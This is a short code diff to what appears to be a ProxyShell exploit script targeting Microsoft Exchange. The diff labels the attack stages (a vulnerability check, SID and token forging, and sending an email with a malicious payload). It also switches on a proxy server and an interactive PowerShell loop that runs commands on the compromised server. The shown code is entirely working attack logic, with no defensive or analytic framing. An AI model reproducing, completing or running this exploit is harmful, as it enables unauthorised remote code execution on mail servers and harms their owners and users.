@@ -240,17 +240,22 @@ def main():
     email = args.e
     local_port = args.p
 
+    # Stage 1
     is_vulnerable = check_proxyshell_on_exchange(exchange_url)
     if not is_vulnerable:
         sys.exit(1)
+    # Stage 2
     sid = get_sid(exchange_url, email)
     token = gen_token(email, sid)
     check_token_valid(exchange_url, token)
+    # Stage 3
     send_email_contains_malicious_payload()
-    # start_server(port=local_port, url=exchange_url, token=token)
 
-    # while True:
-    #     shell(input('PS> '), local_port)
+    # Proxy server
+    start_server(port=local_port, url=exchange_url, token=token)
+
+    while True:
+        shell(input('PS> '), local_port)
 
 
 if __name__ == '__main__':
